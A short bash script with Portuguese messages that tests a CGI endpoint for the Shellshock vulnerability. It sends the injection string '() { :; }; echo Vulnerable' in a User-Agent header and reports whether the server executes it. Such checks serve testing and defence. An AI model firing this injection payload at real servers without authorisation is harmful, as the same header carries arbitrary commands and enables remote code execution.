#!/bin/bash
site="https://www.example.com/cgi-bin/test.cgi"
payload='() { :; }; echo Vulnerable'
resultado=$(curl -A "$payload" -s "$site")

if [[ "$resultado" == *"Vulnerable"* ]]; then
    echo "Vulnerabilidade Shellshock detectada no site $site."
else
    echo "Site seguro, nenhuma vulnerabilidade Shellshock detectada."
fi
